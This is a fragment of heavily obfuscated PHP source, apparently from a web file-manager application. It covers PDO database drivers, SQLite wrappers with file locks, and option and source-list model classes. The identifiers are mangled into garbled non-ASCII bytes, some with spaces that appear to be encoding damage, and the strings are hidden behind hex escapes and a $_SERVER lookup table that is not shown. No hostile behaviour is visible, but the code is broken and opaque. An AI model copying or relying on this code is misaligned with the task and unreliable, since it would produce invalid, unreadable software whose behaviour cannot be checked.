$ÖñÊ¹¿¹[1010] . print_r($•ØË×û°, !0) . $ÖñÊ¹¿¹[1011]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÖñÊ¹¿¹[23], 1); think_status($ÖñÊ¹¿¹[24]); $this->PDOStatement = $this->_linkID->prepare($½×Ë§”Æ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ñì»°ÓÙ = $this->PDOStatement->execute($•ØË×û°); $this->debug(); if (!1 === $ñì»°ÓÙ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($òóëá½÷, $š£€“´Š = array()) { $¦¨ƒû®› =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $òóëá½÷; if (!empty($š£€“´Š)) { $this->queryStr .= $¦¨ƒû®›[1010] . print_r($š£€“´Š, !0) . $¦¨ƒû®›[1011]; } $÷§ù“‹â = !1; if ($this->dbType == $¦¨ƒû®›[1004]) { if (preg_match($¦¨ƒû®›[1012], $this->queryStr, $ğÑ·—ò)) { $this->table = think_config($¦¨ƒû®›[1013]) . str_ireplace(think_config($¦¨ƒû®›[1014]), $¦¨ƒû®›[456], $ğÑ·—ò[2]); $÷§ù“‹â = (bool) $this->query($¦¨ƒû®›[1015] . strtoupper($this->table) . $¦¨ƒû®›[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¦¨ƒû®›[25], 1); think_status($¦¨ƒû®›[24]); $this->PDOStatement = $this->_linkID->prepare($òóëá½÷); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ƒÅÏâôÈ = $this->PDOStatement->execute($š£€“´Š); $this->debug(); if (!1 === $ƒÅÏâôÈ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($÷§ù“‹â || preg_match($¦¨ƒû®›[1016], $òóëá½÷)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ ¿Ú´ûŠ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ ¿Ú´ûŠ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯èæÛì† = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¯èæÛì†) { $this->error(); return !1; } } return !0; } private function getAll() { $ƒ¿ÕÆî½ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ƒ¿ÕÆî½); return $ƒ¿ÕÆî½; } public function getFields($æ¶·şºÀ) { $„»Ú›â¤ =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!0); if (think_config($„»Ú›â¤[1017])) { $ »¼ß¯Ï = str_replace($„»Ú›â¤[1018], $æ¶·şºÀ, think_config($„»Ú›â¤[1017])); } else { switch ($this->dbType) { case $„»Ú›â¤[1001]: case $„»Ú›â¤[1019]: $ »¼ß¯Ï = "\x53\x45\114\105\103\124\40\40\x20\x63\157\154\x75\x6d\x6e\x5f\156\141\x6d\145\x20\141\x73\x20\x27\x4e\141\x6d\145\47\54\x20\x20\x20\x64\x61\x74\x61\137\x74\x79\x70\145\40\x61\x73\40\x27\x54\x79\x70\145\47\x2c\x20\x20\x20\x63\x6f\x6c\x75\155\x6e\137\x64\x65\x66\x61\165\154\164\40\x61\163\40\x27\104\145\146\x61\165\x6c\x74\47\54\40\40\40\151\163\x5f\156\x75\x6c\154\141\x62\154\145\40\x61\x73\x20\47\x4e\165\x6c\x6c\x27\xa\11\x9\106\122\x4f\115\x9\x69\x6e\x66\157\162\155\x61\164\151\157\156\x5f\163\143\150\145\x6d\141\56\x74\x61\x62\154\145\x73\x20\x41\x53\40\164\12\x9\x9\x4a\x4f\111\116\x9\x69\x6e\x66\x6f\162\x6d\141\x74\x69\x6f\x6e\x5f\x73\143\150\145\x6d\141\x2e\143\157\x6c\165\x6d\x6e\x73\x20\101\x53\40\x63\xa\x9\x9\117\116\x20\40\164\56\164\x61\x62\x6c\x65\x5f\143\141\164\141\154\x6f\147\x20\75\40\x63\x2e\164\141\142\154\145\137\143\141\164\x61\x6c\x6f\x67\xa\11\11\x41\116\x44\x20\164\56\164\x61\142\154\x65\137\163\x63\x68\145\155\x61\x20\x3d\x20\x63\56\x74\141\x62\x6c\x65\137\x73\143\150\145\x6d\141\xa\11\11\101\116\x44\x20\x74\56\164\x61\x62\154\x65\137\156\x61\x6d\x65\x20\x3d\x20\143\56\164\141\x62\x6c\145\137\156\141\x6d\x65\xa\x9\x9\127\110\x45\122\105\40\40\x20\164\56\x74\141\x62\x6c\145\x5f\x6e\x61\155\145\40\x3d\x20\47{$æ¶·şºÀ}\47"; break; case $„»Ú›â¤[1020]: $ »¼ß¯Ï = $„»Ú›â¤[1021] . $æ¶·şºÀ . $„»Ú›â¤[1022]; break; case $„»Ú›â¤[1002]: case $„»Ú›â¤[1004]: $ »¼ß¯Ï = $„»Ú›â¤[1023] . $„»Ú›â¤[1024] . $„»Ú›â¤[1025] . strtoupper($æ¶·şºÀ) . $„»Ú›â¤[1026] . strtoupper($æ¶·şºÀ) . $„»Ú›â¤[1027]; break; case $„»Ú›â¤[1028]: $ »¼ß¯Ï = $„»Ú›â¤[1029] . $æ¶·şºÀ . $„»Ú›â¤[1030]; break; case $„»Ú›â¤[1003]: break; case $„»Ú›â¤[1031]: default: $ »¼ß¯Ï = $„»Ú›â¤[1032] . ($this->dbType == $„»Ú›â¤[1031] ? "\x60{$æ¶·şºÀ}\140" : $æ¶·şºÀ); } } $°ÀÌÓ‘ = $this->query($ »¼ß¯Ï); $…º¢ëø§ = array(); if ($°ÀÌÓ‘) { foreach ($°ÀÌÓ‘ as $¥ÔÕéªĞ => $ä˜Âùñâ) { $ä˜Âùñâ = array_change_key_case($ä˜Âùñâ); $ä˜Âùñâ[$„»Ú›â¤[32]] = isset($ä˜Âùñâ[$„»Ú›â¤[32]]) ? $ä˜Âùñâ[$„»Ú›â¤[32]] : $„»Ú›â¤[456]; $ä˜Âùñâ[$„»Ú›â¤[33]] = isset($ä˜Âùñâ[$„»Ú›â¤[33]]) ? $ä˜Âùñâ[$„»Ú›â¤[33]] : $„»Ú›â¤[456]; $·£ìĞ = isset($ä˜Âùñâ[$„»Ú›â¤[352]]) ? $ä˜Âùñâ[$„»Ú›â¤[352]] : $ä˜Âùñâ[$„»Ú›â¤[32]]; $…º¢ëø§[$·£ìĞ] = array($„»Ú›â¤[32] => $·£ìĞ, $„»Ú›â¤[33] => $ä˜Âùñâ[$„»Ú›â¤[33]], $„»Ú›â¤[35] => (bool) (isset($ä˜Âùñâ[$„»Ú›â¤[106]]) && $ä˜Âùñâ[$„»Ú›â¤[106]] === $„»Ú›â¤[12] || isset($ä˜Âùñâ[$„»Ú›â¤[35]]) && $ä˜Âùñâ[$„»Ú›â¤[35]] === $„»Ú›â¤[12]), $„»Ú›â¤[37] => isset($ä˜Âùñâ[$„»Ú›â¤[37]]) ? $ä˜Âùñâ[$„»Ú›â¤[37]] : (isset($ä˜Âùñâ[$„»Ú›â¤[56]]) ? $ä˜Âùñâ[$„»Ú›â¤[56]] : $„»Ú›â¤[456]), $„»Ú›â¤[39] => isset($ä˜Âùñâ[$„»Ú›â¤[97]]) ? strtolower($ä˜Âùñâ[$„»Ú›â¤[97]]) == $„»Ú›â¤[41] : (isset($ä˜Âùñâ[$„»Ú›â¤[57]]) ? $ä˜Âùñâ[$„»Ú›â¤[57]] : !1), $„»Ú›â¤[42] => isset($ä˜Âùñâ[$„»Ú›â¤[1033]]) ? strtolower($ä˜Âùñâ[$„»Ú›â¤[1033]]) == $„»Ú›â¤[44] : (isset($ä˜Âùñâ[$„»Ú›â¤[97]]) ? $ä˜Âùñâ[$„»Ú›â¤[97]] : !1)); } } return $…º¢ëø§; } public function getTables($‡ïİ…Æ¼ = '') { $¿ĞÓÅçö =& $_SERVER[¶Ô„œ…¯]; if (think_config($¿ĞÓÅçö[1034])) { $¶İ–º± = str_replace($¿ĞÓÅçö[1035], $‡ïİ…Æ¼, think_config($¿ĞÓÅçö[1034])); } else { switch ($this->dbType) { case $¿ĞÓÅçö[1002]: case $¿ĞÓÅçö[1004]: $¶İ–º± = $¿ĞÓÅçö[1036]; break; case $¿ĞÓÅçö[1001]: case $¿ĞÓÅçö[1019]: $¶İ–º± = $¿ĞÓÅçö[1037]; break; case $¿ĞÓÅçö[1028]: $¶İ–º± = $¿ĞÓÅçö[1038]; break; case $¿ĞÓÅçö[1003]: think_exception(think_lang($¿ĞÓÅçö[1039]) . $¿ĞÓÅçö[1040]); break; case $¿ĞÓÅçö[1020]: $¶İ–º± = $¿ĞÓÅçö[45] . $¿ĞÓÅçö[46] . $¿ĞÓÅçö[47]; break; case $¿ĞÓÅçö[1031]: default: if (!empty($‡ïİ…Æ¼)) { $¶İ–º± = $¿ĞÓÅçö[983] . $‡ïİ…Æ¼ . $¿ĞÓÅçö[984]; } else { $¶İ–º± = $¿ĞÓÅçö[985]; } } } $ÎÍü®×â = $this->query($¶İ–º±); $ôè¸ôã¤ = array(); foreach ($ÎÍü®×â as $æê™ø · => $ –ù¾Äƒ) { $ôè¸ôã¤[$æê™ø ·] = current($ –ù¾Äƒ); } return $ôè¸ôã¤; } protected function parseLimit($È†ÒÙç) { $±µ„çà =& $_SERVER[¶Ô„œ…¯]; $ÃÏÕµßª = $±µ„çà[12]; if (!empty($È†ÒÙç)) { switch ($this->dbType) { case $±µ„çà[1028]: case $±µ„çà[1020]: $È†ÒÙç = explode($±µ„çà[50], $È†ÒÙç); if (count($È†ÒÙç) > 1) { $ÃÏÕµßª .= $±µ„çà[51] . $È†ÒÙç[1] . $±µ„çà[52] . $È†ÒÙç[0] . $±µ„çà[53]; } else { $ÃÏÕµßª .= $±µ„çà[51] . $È†ÒÙç[0] . $±µ„çà[53]; } break; case $±µ„çà[1001]: case $±µ„çà[1019]: break; case $±µ„çà[1003]: break; case $±µ„çà[1002]: case $±µ„çà[1004]: break; case $±µ„çà[1031]: default: $ÃÏÕµßª .= $±µ„çà[51] . $È†ÒÙç . $±µ„çà[53]; } } return $ÃÏÕµßª; } public function parseKey(&$ëùÆÚÄ, $÷¡ÏÅğš = true) { $±ü¿§„ç =& $_SERVER[¶Ô„œ…¯]; if ($÷¡ÏÅğš) { $ëùÆÚÄ = $this->parseKeyCheck($ëùÆÚÄ); } if ($this->dbType == $±ü¿§„ç[1031]) { if ($ëùÆÚÄ != $±ü¿§„ç[222] && !preg_match($±ü¿§„ç[995], $ëùÆÚÄ)) { $ëùÆÚÄ = $±ü¿§„ç[463] . trim($ëùÆÚÄ, $±ü¿§„ç[463]) . $±ü¿§„ç[463]; } return $ëùÆÚÄ; } else { return parent::parseKey($ëùÆÚÄ, $÷¡ÏÅğš); } } public function close() { $this->_linkID = null; } public function error() { $ê‰‰¦İ =& $_SERVER[¶Ô„œ…¯]; if ($this->PDOStatement) { $øÉ˜‰¶Ç = $this->PDOStatement->errorInfo(); $this->error = $øÉ˜‰¶Ç[1] . $ê‰‰¦İ[4] . $øÉ˜‰¶Ç[2]; } else { $this->error = $ê‰‰¦İ[12]; } if ($ê‰‰¦İ[12] != $this->queryStr) { $this->error .= LNG($ê‰‰¦İ[48]) . $this->queryStr; } think_trace($this->error, $ê‰‰¦İ[12], $ê‰‰¦İ[49]); return $this->error; } public function escapeString($ÈÏÜ®“) { $æ³Ğ¶è” =& $_SERVER[¶Ô„œ…¯]; switch ($this->dbType) { case $æ³Ğ¶è”[1028]: case $æ³Ğ¶è”[1001]: case $æ³Ğ¶è”[1019]: case $æ³Ğ¶è”[1031]: return addslashes($ÈÏÜ®“); case $æ³Ğ¶è”[1003]: case $æ³Ğ¶è”[1020]: case $æ³Ğ¶è”[1002]: case $æ³Ğ¶è”[1004]: return str_ireplace($æ³Ğ¶è”[58], $æ³Ğ¶è”[59], $ÈÏÜ®“); } } protected function parseValue($‡†ß ê½) { $ÅÔå¼õ° =& $_SERVER[¶Ô„œ…¯]; if (is_string($‡†ß ê½)) { $°ğòƒ£ = strpos($‡†ß ê½, $ÅÔå¼õ°[4]) === 0 && in_array($‡†ß ê½, array_keys($this->bind)); $‡†ß ê½ = $°ğòƒ£ ? $this->escapeString($‡†ß ê½) : $ÅÔå¼õ°[1041] . $this->escapeString($‡†ß ê½) . $ÅÔå¼õ°[1041]; } elseif (isset($‡†ß ê½[0]) && is_string($‡†ß ê½[0]) && strtolower($‡†ß ê½[0]) == $ÅÔå¼õ°[374]) { $‡†ß ê½ = $this->escapeString($‡†ß ê½[1]); } elseif (is_array($‡†ß ê½)) { $‡†ß ê½ = array_map(array($this, $ÅÔå¼õ°[1042]), $‡†ß ê½); } elseif (is_bool($‡†ß ê½)) { $‡†ß ê½ = $‡†ß ê½ ? $ÅÔå¼õ°[91] : $ÅÔå¼õ°[230]; } elseif (is_null($‡†ß ê½)) { $‡†ß ê½ = $ÅÔå¼õ°[106]; } return $‡†ß ê½; } public function getLastInsertId() { $œÎ³±ù× =& $_SERVER[¶Ô„œ…¯]; switch ($this->dbType) { case $œÎ³±ù×[1028]: case $œÎ³±ù×[1020]: case $œÎ³±ù×[1001]: case $œÎ³±ù×[1019]: case $œÎ³±ù×[1003]: case $œÎ³±ù×[1031]: return $this->_linkID->lastInsertId(); case $œÎ³±ù×[1002]: case $œÎ³±ù×[1004]: $æåôÙµœ = $this->table; $Ë§ÁíïÍ = $this->query("\x53\105\114\105\103\124\40{$æåôÙµœ}\56\x63\x75\x72\x72\166\x61\x6c\40\x63\x75\162\162\166\141\x6c\40\106\x52\117\x4d\x20\x64\165\x61\x6c"); return $Ë§ÁíïÍ ? $Ë§ÁíïÍ[0][$œÎ³±ù×[1043]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($»å–ÎæØ) { $Ø²óÈ¬® =& $_SERVER[¶Ô„œ…¯]; if (!CacheLock::fileLock($Ø²óÈ¬®[13])) { return !1; } $“˜™›¨Å = parent::query($»å–ÎæØ); CacheLock::fileUnLock($Ø²óÈ¬®[13]); return $“˜™›¨Å; } public function execute($Î©ÛÈŞ) { $îÁ×ô–È =& $_SERVER[¶Ô„œ…¯]; if (!CacheLock::fileLock($îÁ×ô–È[13])) { return !1; } $ŞÍıÛ—‰ = parent::execute($Î©ÛÈŞ); CacheLock::fileUnLock($îÁ×ô–È[13]); return $ŞÍıÛ—‰; } } class DbSqlite3 extends DbSqlite3Base { public function query($¹Ò™ š) { $µçëÑŸß =& $_SERVER[¶Ô„œ…¯]; if (!CacheLock::fileLock($µçëÑŸß[13])) { return !1; } $ÅÉëÏø = parent::query($¹Ò™ š); CacheLock::fileUnLock($µçëÑŸß[13]); return $ÅÉëÏø; } public function execute($‰éÖæÚ¨) { $ú©¾¯½á =& $_SERVER[¶Ô„œ…¯]; if (!CacheLock::fileLock($ú©¾¯½á[13])) { return !1; } $™¼õ·Í¹ = parent::execute($‰éÖæÚ¨); CacheLock::fileUnLock($ú©¾¯½á[13]); return $™¼õ·Í¹; } } goto eÊİ²°İ; e…¨¿¬ù×²: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\155\x4f\160\x74\x69\x6f\156"; public $field = array(); public function listData($½îª¬‡İ = false, $Ô‚ÛÔ÷ = "\x6d\157\144\x69\146\171\124\x69\x6d\145", $Ü¢ûš¯— = false) { $øãÓÓ³ë = Model($this->modelType)->get(!1, $this->optionType, !0); $ÜÂİËš« = array_values($øãÓÓ³ë); if ($ÜÂİËš« && $ÜÂİËš«[0] && !is_array($ÜÂİËš«[0])) { Model($this->modelType)->cacheRemove($this->optionType); $øãÓÓ³ë = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$øãÓÓ³ë) { return $½îª¬‡İ ? null : array(); } if (!$½îª¬‡İ) { $øãÓÓ³ë = array_filter(array_values($øãÓÓ³ë)); return array_sort_by($øãÓÓ³ë, $Ô‚ÛÔ÷, $Ü¢ûš¯—); } return $øãÓÓ³ë[$_SERVER[¶Ô„œ…¯][474] . $½îª¬‡İ]; } public function insert($œÈêêÆ›) { $éÜã“ÅŒ =& $_SERVER[¶Ô„œ…¯]; $œÈêêÆ› = array_field_key($œÈêêÆ›, $this->field); $üå×Â÷Ó = Model($this->modelType)->get($éÜã“ÅŒ[475], $this->optionType . $éÜã“ÅŒ[476]); $üå×Â÷Ó = $üå×Â÷Ó ? $üå×Â÷Ó : 0; $œÈêêÆ›[$éÜã“ÅŒ[477]] = ++$üå×Â÷Ó; $œÈêêÆ›[$éÜã“ÅŒ[233]] = time(); $œÈêêÆ›[$éÜã“ÅŒ[88]] = time(); Model($this->modelType)->set($éÜã“ÅŒ[475], $üå×Â÷Ó, $this->optionType . $éÜã“ÅŒ[476]); Model($this->modelType)->set($éÜã“ÅŒ[474] . $üå×Â÷Ó, $œÈêêÆ›, $this->optionType); return $üå×Â÷Ó; } public function update($¹–ïÖ£, $ş³åûÂ¦) { $Ùåèí÷ =& $_SERVER[¶Ô„œ…¯]; $ş³åûÂ¦ = array_field_key($ş³åûÂ¦, $this->field); $–¦Şƒ‡ = $this->listData($¹–ïÖ£); if (!$–¦Şƒ‡ || !$¹–ïÖ£) { return !1; } $ş³åûÂ¦ = array_merge($–¦Şƒ‡, $ş³åûÂ¦); $ş³åûÂ¦[$Ùåèí÷[88]] = time(); return Model($this->modelType)->set($Ùåèí÷[474] . $¹–ïÖ£, $ş³åûÂ¦, $this->optionType); } public function remove($Šâ‚µ‡´) { if (!$Šâ‚µ‡´) { return !1; } return Model($this->modelType)->remove($_SERVER[¶Ô„œ…¯][474] . $Šâ‚µ‡´, $this->optionType); } public function clear() { $İ„á½œ =& $_SERVER[¶Ô„œ…¯]; Model($this->modelType)->remove($İ„á½œ[475], $this->optionType . $İ„á½œ[476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ùÌÂ¯Ò˜, $á÷î²Ö§) { if (!$á÷î²Ö§) { return !1; } $†Ì÷Ô¿ = $this->listData(); $†Ì÷Ô¿ = array_to_keyvalue($†Ì÷Ô¿, $ùÌÂ¯Ò˜); return isset($†Ì÷Ô¿[$á÷î²Ö§]) ? $†Ì÷Ô¿[$á÷î²Ö§] : !1; } public function findByName($âúÙÅ¥ì) { return $this->findByKey($_SERVER[¶Ô„œ…¯][32], $âúÙÅ¥ì); } protected function resetData($ÌÍéèõÒ) { $®†óˆ  =& $_SERVER[¶Ô„œ…¯]; $ÌÍéèõÒ = is_array($ÌÍéèõÒ) ? $ÌÍéèõÒ : array(); $µáÊ×ÒÉ = array(); for ($ÀÏÇÌïù = 0; $ÀÏÇÌïù < count($ÌÍéèõÒ); $ÀÏÇÌïù++) { $µáÊ×ÒÉ[$®†óˆ [474] . $ÌÍéèõÒ[$ÀÏÇÌïù][$®†óˆ [477]]] = $ÌÍéèõÒ[$ÀÏÇÌïù]; } return Model($this->modelType)->set($µáÊ×ÒÉ, !1, $this->optionType); } private function getAutoName($àôË•†Î) { $İ¨’¯æµ = array_to_keyvalue($this->listData(), $_SERVER[¶Ô„œ…¯][32]); if (!$İ¨’¯æµ || !isset($İ¨’¯æµ[$àôË•†Î])) { return $àôË•†Î; } for ($ù±ÚÎ¿® = 1; $ù±ÚÎ¿® < count($İ¨’¯æµ); $ù±ÚÎ¿®++) { $âÁî”ÛÄ = $àôË•†Î . "\50{$ù±ÚÎ¿®}\x29"; if (!isset($İ¨’¯æµ[$âÁî”ÛÄ])) { return $âÁî”ÛÄ; } } return $âÁî”ÛÄ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($£êôĞÔ® = false, $ñ·­ë¦¨ = '', $éæ–±Óõ = false) { $’Íõ¶¶Á =& $_SERVER[¶Ô„œ…¯]; $¨©‰œ€¡ = $this->cacheGet($ñ·­ë¦¨); $èÅå¨Ì´ = $this->optionDefault($ñ·­ë¦¨); $èÅå¨Ì´ = is_array($èÅå¨Ì´) ? $èÅå¨Ì´ : array(); if (is_array($¨©‰œ€¡)) { $¨©‰œ€¡ = array_merge($èÅå¨Ì´, $¨©‰œ€¡); return $£êôĞÔ® ? isset($¨©‰œ€¡[$£êôĞÔ®]) ? $¨©‰œ€¡[$£êôĞÔ®] : null : $¨©‰œ€¡; } $´Ûò˜Ôç = $this->filterWhere(array($’Íõ¶¶Á[33] => $ñ·­ë¦¨)); $¨©‰œ€¡ = $this->where($´Ûò˜Ôç)->select(); $¨©‰œ€¡ = array_to_keyvalue($¨©‰œ€¡, $’Íõ¶¶Á[97], $’Íõ¶¶Á[452]); foreach ($¨©‰œ€¡ as $üöñÈ„Î => $èÏ†‡ÇÀ) { if ($éæ–±Óõ || in_array($üöñÈ„Î, $this->jsonField)) { $¨©‰œ€¡[$üöñÈ„Î] = json_decode($èÏ†‡ÇÀ, !0); } } $this->cacheSet($ñ·­ë¦¨, $¨©‰œ€¡); $¨©‰œ€¡ = array_merge($èÅå¨Ì´, $¨©‰œ€¡); return $£êôĞÔ® ? $¨©‰œ€¡[$£êôĞÔ®] : $¨©‰œ€¡; } public function set($²ïäàÊÃ, $õßÂ­Ûë = false, $Ü¼‘­³Ä = '') { $û÷©“¾Ò =& $_SERVER[¶Ô„œ…¯]; $this->cacheRemove($Ü¼‘­³Ä); $…ÀÌ½à¶ = array(); $¢§ÈÇ“ = is_array($²ïäàÊÃ) ? $²ïäàÊÃ : array($²ïäàÊÃ => $õßÂ­Ûë); foreach ($¢§ÈÇ“ as $ Ùûè˜ => $¢¶Æ‘î¬) { if (is_array($¢¶Æ‘î¬)) { $¢¶Æ‘î¬ = json_encode_force($¢¶Æ‘î¬); } $this->checkLength($¢¶Æ‘î¬, !1, $this->tableName . $û÷©“¾Ò[4] . $²ïäàÊÃ); $¢¶Æ‘î¬ = self::textEncode($¢¶Æ‘î¬); $¢§ÈÇ“ = array($û÷©“¾Ò[33] => $Ü¼‘­³Ä, $û÷©“¾Ò[97] => $ Ùûè˜, $û÷©“¾Ò[452] => $¢¶Æ‘î¬); $…ÀÌ½à¶[] = $this->filterWhere($¢§ÈÇ“); } if (!$…ÀÌ½à¶) { return !0; } $‘ÎİšŒä = $this->cacheKey($û÷©“¾Ò[478]); CacheLock::lock($‘ÎİšŒä); $¥’˜Ş„œ = $this->addAll($…ÀÌ½à¶, array(), !0); CacheLock::unlock($‘ÎİšŒä); return $¥’˜Ş„œ; } protected function optionDefault($È–à×Ä– = '') { return !1; } public function setDeep($åçòÚ¶Û, $İº¹Ëâ³ = false, $‹ÚŞóƒ× = '') { $‚øú¬ç = explode($_SERVER[¶Ô„œ…¯][10], $åçòÚ¶Û); $‘¨°†×ó = $this->get(); array_set_value($‘¨°†×ó, $åçòÚ¶Û, $İº¹Ëâ³); $this->set($‚øú¬ç[0], $‘¨°†×ó[$‚øú¬ç[0]], $‹ÚŞóƒ×); } public function remove($—î”ß‰¡, $ÛÚÌ‹»˜ = '') { $š¥ê“œ =& $_SERVER[¶Ô„œ…¯]; $this->cacheRemove($ÛÚÌ‹»˜); $—ç‚’Í = $this->filterWhere(array($š¥ê“œ[97] => $—î”ß‰¡, $š¥ê“œ[33] => $ÛÚÌ‹»˜)); if (is_null($—î”ß‰¡)) { unset($—ç‚’Í[$š¥ê“œ[97]]); } return $this->where($—ç‚’Í)->delete(); } public function cacheSet($ëÌ°ı‚³, $ç«î¬ƒ = false) { return Cache::set($this->cacheKey($ëÌ°ı‚³), $ç«î¬ƒ); } public function cacheGet($ì°ôª’ú) { return Cache::get($this->cacheKey($ì°ôª’ú)); } public function cacheRemove($ØÜ†àÅ½) { return Cache::remove($this->cacheKey($ØÜ†àÅ½)); } protected function filterWhere($‡åÔ²è) { return $‡åÔ²è; } protected function cacheKey($ğÂÇî¸„) { return $ğÂÇî¸„; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\143\145"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\x6d\x65" => "\x69\157\x5f\163\x6f\x75\x72\x63\145\x5f\155\x65\x74\141", "\155\145\x74\141\x46\151\145\x6c\144" => "\x73\157\x75\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\x66\171\x54\151\x6d\x65", "\164\x69\155\145", "\151\x6e\163\145\x72\164", "\x66\x75\156\x63\164\x69\x6f\x6e"), array("\x63\162\x65\141\x74\x65\x54\x69\155\x65", "\x74\151\x6d\145", "\151\156\163\x65\162\164", "\x66\x75\x6e\x63\x74\x69\157\x6e"), array("\166\151\x65\167\x54\151\155\x65", "\x74\151\155\145", "\151\x6e\163\145\162\x74", "\146\x75\x6e\x63\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($îôæ’™) { return $this->listSource(array($_SERVER[¶Ô„œ…¯][479] => $îôæ’™)); } public function typeName($ŒÏÔàñ) { static $¦ûã—¸ì = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\145\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\147\x72\x6f\165\160"); return $¦ûã—¸ì[$ŒÏÔàñ . $_SERVER[¶Ô„œ…¯][12]]; } public function sourceListInfo($“æ˜¿Ôî, $ëŒôÌ´Ç = false) { $ÉÀŒŸµ =& $_SERVER[¶Ô„œ…¯]; $“æ˜¿Ôî = $“æ˜¿Ôî ? $“æ˜¿Ôî : array(); $“æ˜¿Ôî = array_filter(array_unique($“æ˜¿Ôî)); if (!$“æ˜¿Ôî) { return array(); } $¢ÉşëØ× = $this->where(array($ÉÀŒŸµ[193] => array($ÉÀŒŸµ[7], $“æ˜¿Ôî)))->select(); $this->_listDataApply($¢ÉşëØ×, $ëŒôÌ´Ç); return array_to_keyvalue($¢ÉşëØ×, $ÉÀŒŸµ[193]); } public function pathInfoFilter(&$– œïˆÈ) { $úú•Îá® =& $_SERVER[¶Ô„œ…¯]; static $í•¢ËàŞ = false; static $×ë­Š¥­ = false; static $ˆÙ‡—÷ª = false; if (!$í•¢ËàŞ) { $å³©çÛ« = $úú•Îá®[480]; $å³©çÛ« .= $úú•Îá®[481]; $å³©çÛ« .= $úú•Îá®[482]; $‘À¯â¯€ = $úú•Îá®[483]; $€¡¿¨´— = explode($úú•Îá®[50], $‘À¯â¯€); $í•¢ËàŞ = explode($úú•Îá®[50], $å³©çÛ«); $×ë­Š¥­ = array(); foreach ($í•¢ËàŞ as $ĞÚõ¨ˆ) { if (in_array($ĞÚõ¨ˆ, $€¡¿¨´—)) { continue; } $×ë­Š¥­[] = $ĞÚõ¨ˆ; } $ˆÙ‡—÷ª = explode($úú•Îá®[50], $úú•Îá®[484]); } foreach ($ˆÙ‡—÷ª as $™—Ô†•Í) { if (isset($– œïˆÈ[$™—Ô†•Í])) { $– œïˆÈ[$™—Ô†•Í] = intval($– œïˆÈ[$™—Ô†•Í]); } } $– œïˆÈ[$úú•Îá®[87]] = $úú•Îá®[485] . $– œïˆÈ[$úú•Îá®[193]] . $úú•Îá®[486]; $– œïˆÈ[$úú•Îá®[33]] = $– œïˆÈ[$úú•Îá®[487]] == 1 ? $úú•Îá®[78] : $úú•Îá®[232]; $– œïˆÈ[$úú•Îá®[190]] = $this->typeName($– œïˆÈ[$úú•Îá®[190]]); if ($– œïˆÈ[$úú•Îá®[487]] != 1) { $– œïˆÈ[$úú•Îá®[169]] = $– œïˆÈ[$úú•Îá®[488]]; unset($– œïˆÈ[$úú•Îá®[488]]); } $ŒÉ¨şÁ® = $í•¢ËàŞ; if (isset($– œïˆÈ[$úú•Îá®[489]]) && $– œïˆÈ[$úú•Îá®[489]][$úú•Îá®[490]] == -1) { $ŒÉ¨şÁ® = $×ë­Š¥­; } $– œïˆÈ = array_field_key($– œïˆÈ, $ŒÉ¨şÁ®); return $– œïˆÈ; } public function listUserFav() { $Ş´ËÇàÉ =& $_SERVER[¶Ô„œ…¯]; $ÈÜ£Ñ›‰ = Model($Ş´ËÇàÉ[491])->listData(); $ãÅƒ‘ÃÏ = array_filter_by_field($ÈÜ£Ñ›‰, $Ş´ËÇàÉ[33], $Ş´ËÇàÉ[492]); $ãÅƒ‘ÃÏ = array_to_keyvalue($ãÅƒ‘ÃÏ, $Ş´ËÇàÉ[12], $Ş´ËÇàÉ[87]); if ($ãÅƒ‘ÃÏ) { $€‘ºŒ¼ = $this->listSource(array($Ş´ËÇàÉ[493] => array($Ş´ËÇàÉ[494], $ãÅƒ‘ÃÏ))); } $€‘ºŒ¼ = array_to_keyvalue($€‘ºŒ¼[$Ş´ËÇàÉ[447]], $Ş´ËÇàÉ[193]); foreach ($ÈÜ£Ñ›‰ as &$‘õ°¥¤®) { $‘õ°¥¤® = array($Ş´ËÇàÉ[495] => $‘õ°¥¤®[$Ş´ËÇàÉ[477]], $Ş´ËÇàÉ[496] => $‘õ°¥¤®[$Ş´ËÇàÉ[32]], $Ş´ËÇàÉ[497] => $‘õ°¥¤®[$Ş´ËÇàÉ[87]], $Ş´ËÇàÉ[498] => $‘õ°¥¤®[$Ş´ËÇàÉ[33]], $Ş´ËÇàÉ[499] => $‘õ°¥¤®[$Ş´ËÇàÉ[233]], $Ş´ËÇàÉ[500] => $‘õ°¥¤®[$Ş´ËÇàÉ[88]]); if ($‘õ°¥¤®[$Ş´ËÇàÉ[33]] == $Ş´ËÇàÉ[492] && $€‘ºŒ¼[$‘õ°¥¤®[$Ş´ËÇàÉ[87]]]) { $‘õ°¥¤®[$Ş´ËÇàÉ[90]] = 